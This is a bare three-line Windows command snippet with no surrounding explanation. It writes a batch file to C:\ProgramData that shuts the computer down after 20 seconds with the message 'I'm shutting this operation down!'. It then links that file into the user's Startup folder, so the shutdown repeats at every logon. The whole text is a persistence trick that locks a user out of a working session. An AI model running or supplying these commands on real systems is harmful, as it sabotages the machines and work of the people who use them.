echo @echo off >> C:\ProgramData\rest.bat
echo shutdown.exe /s /t 20 /c "I'm shutting this operation down!" >> C:\ProgramData\rest.bat
cmd /c mklink "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\rest.bat.lnk" "C:\ProgramData\rest.bat"
